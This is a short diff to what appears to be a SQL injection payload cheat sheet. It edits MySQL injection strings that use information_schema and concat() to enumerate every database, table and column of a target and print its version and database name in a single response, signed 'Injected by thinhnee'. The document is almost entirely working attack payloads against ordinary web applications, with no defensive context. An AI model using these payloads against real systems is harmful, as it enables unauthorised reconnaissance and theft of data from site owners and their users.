@@ -11,7 +11,8 @@
 (select (@a) from (select(@a:=0x00),(@tbl:=0x00),(@tbl_sc:=0x00),(@num:=0),(select (@a) from (information_schema.columns) where (table_schema!='information_schema') and(0x00)in (@a:=concat(@a,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,@num:=(@num%2b1),0x2920,@tbl_sc:=table_schema,' :: ',@tbl:=table_name,' (Rows ',(select columns_row from information_schema.columns where table_schema=@tbl_sc and table_name=@tbl),')<br>',column_name), (column_name))))))a)
 
 -- extract data using concat, basic 
-concat('Injected by thinhnee','<br>','Version:', version(),'<br>','Database: ', database(),'<br>',(select (@a) from (select (@a:=0x00),(select (@a) from (information_schema.tables) where table_schema not like 'information_schema' and (@a)in(@a:=concat(@a,table_name,'<br>'))))a))
+concat('Injected by thinhnee','<br>','Version:', version(),'<br>','Database: ', database(),'<br>',(select (@a) from (select (@a:=0x00),(select (@a) from information_schema.columns where table_schema not like 'information_schema'and (@a) in (@a:=concat(@a,table_schema,'::',table_name,'::',column_name,'<br>'))))a))
+
 
 --Print name, version, database, user, data using html
 --yellow
